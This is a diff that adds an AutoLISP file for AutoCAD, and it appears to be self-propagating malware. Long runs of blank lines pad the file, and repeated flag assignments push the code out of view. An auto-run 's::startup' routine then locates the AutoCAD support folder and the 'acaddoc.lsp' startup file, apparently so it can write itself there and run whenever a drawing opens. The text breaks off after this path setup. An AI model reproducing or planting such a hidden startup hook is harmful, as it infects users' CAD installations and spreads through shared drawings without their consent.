@@ -1,0 +1,81 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+(setq flagx t)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+(setq flagx t)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+(setq flagx t)
+(defun-q s::startup
+	 (/ basepath
+	    baseacad
+	    acaddocpath
+	    r-acaddoc
+	    w-basepath
+	    rl-acaddoc
+	    acaddoclsp
+	    c-acaddocname
+	    c-acaddocpath
+	    c-acaddoc
+	   )
+     (setq basepath
+	    (findfile "base.dcl")
+     )
+     (setq basepath
+	    (substr basepath
+		    1 (- (strlen basepath) 8)
+            )
+     )
+     (setq baseacad (strcat basepath "acaddoc.lsp"))
+  
+	(setq acaddocpath
+               (findfile "acaddoc.lsp")
+	)
+	(setq acaddocpath
+	       (substr acaddocpath
+		       1 (- (strlen acaddocpath) 11)
+	       )
+	)
